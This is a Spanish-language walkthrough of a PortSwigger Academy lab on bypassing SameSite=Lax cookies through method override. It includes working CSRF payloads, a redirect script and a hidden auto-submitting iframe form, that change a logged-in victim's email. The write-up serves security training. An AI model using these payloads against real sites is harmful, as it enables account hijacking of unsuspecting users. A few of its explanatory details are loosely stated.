# PortSwigger Lab: SameSite Lax bypass via method override

**Plataforma:** PortSwigger Web Security Academy  
**Dificultad:** Fácil  
**Tipo:** CSRF (Cross-Site Request Forgery)  
**Objetivo:** Cambiar email bypasseando SameSite=Lax con method override  
**Credenciales:** `wiener:peter`

---

## Flujo del ataque

```
Login GET → Cookie enviada (Lax permite GET)
→ Descubrir endpoint GET con _method=POST
→ Cambiar email con método GET bypasea SameSite
→ Payload GET con email + _method=POST
→ Exploit server → Enviar a víctima
```

---

## 1. SameSite Lax explicado

![Login GET request](imagen-1-login-get.png)

### Valores de SameSite

| Valor | GET cross-site | POST cross-site |
|-------|---|---|
| Strict | ❌ No | ❌ No |
| **Lax** | ✅ Sí | ❌ No |
| None | ✅ Sí | ✅ Sí |

**Chrome default:** Si no se especifica, usa Lax automáticamente.

### Implicación

- Link externo → GET → Cookie enviada ✅
- Formulario cross-site → POST → Cookie NO enviada ❌

Lax protege POST pero permite GET.

---

## 2. Endpoint Change Email

![My account change email](imagen-2-change-email.png)

### Petición POST normal

```http
POST /my-account/change-email HTTP/2
Cookie: session=ABpxRywcDumM4oZecbjmLuH8vfDuEKh

email=awdaw@fawda
```

**SameSite=Strict:** Cookie NO se envía cross-site en POST.

Resultado: CSRF no funciona.

---

## 3. Method Override Discovery

![POST request intercepted](imagen-3-post-request.png)

### Prueba 1: GET simple

```http
GET /my-account/change-email?email=test@test
```

**Resultado:** `405 Method Not Allowed`

### Prueba 2: GET + _method=POST

```http
GET /my-account/change-email?email=test@test&_method=POST
```

**Resultado:** `302 Found` — Email se cambia.

**Breakthrough:** El servidor interpreta GET con `_method=POST` como POST válido.

---

## 4. Por qué funciona el bypass

### Timing de SameSite

1. Navegador recibe GET desde atacante
2. SameSite=Lax: ✅ "Es GET, puedo enviar cookie"
3. Cookie incluida en GET automáticamente
4. Servidor recibe GET + _method=POST
5. Interpreta como POST, pero cookie ya fue enviada
6. Autenticación ✅ (cookie presente)
7. Email cambio ✅

SameSite Lax protege POST, no GET. El `_method=POST` es un truco posterior.

---

## 5. Payload — Opción 1: document.location

```html
<script>
  document.location = "https://target.com/my-account/change-email?email=hacked%40hacked.com&_method=POST"
</script>
```

**Flujo:**
1. Víctima accede a payload
2. Script redirige (GET)
3. SameSite=Lax envía cookie
4. Servidor recibe _method=POST
5. Email cambiado
6. Página recarga en target

Ventaja: Simple
Desventaja: Visible (redirección)

---

## 6. Payload — Opción 2: Form GET (oculto)

![Email changed confirmation](imagen-4-email-changed.png)

```html
<iframe name="csrf-frame" style="display:none;"></iframe>

<form action="https://target.com/my-account/change-email" method="GET" target="csrf-frame">
  <input type="hidden" name="_method" value="POST">
  <input type="hidden" name="email" value="hacked@hacked.com">
</form>

<script>
  document.forms[0].submit();
</script>
```

**Flujo:**
1. Iframe oculto + formulario GET
2. submit() dispara automáticamente
3. SameSite=Lax permite GET → cookie enviada
4. _method=POST en parámetro
5. Email cambiado en iframe (invisible)
6. Víctima no ve nada

Ventaja: Silencioso
Desventaja: Requiere JavaScript

---

## 7. Lab resuelto

![Congratulations lab solved](imagen-5-lab-solved.png)

---

## Por qué funciona

- SameSite Lax permite GET cross-site (diseño)
- Method Override reinterpreta GET como POST (post-procesamiento)
- Cookie enviada en GET, validación ocurre después
- Timing: `_method` se procesa después de autenticación
- Navegador + servidor coordinan mal la defensa

---

## Vulnerabilidades relacionadas

- **Method Override genérico:** `_method`, `X-HTTP-Method-Override`, `X-Method-Override`
- **Frameworks afectados:** Laravel, Rails, Express, otros
- **SameSite Lax es default:** Chrome, Firefox, Safari (pero no IE)

---

## Referencias

- [PortSwigger — CSRF](https://portswigger.net/web-security/csrf)
- [MDN — SameSite Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite)
- [OWASP — CSRF Prevention](https://owasp.org/www-community/attacks/csrf)
- [Method Override Vulnerability](https://owasp.org/www-community/attacks/HTTP_Parameter_Override)
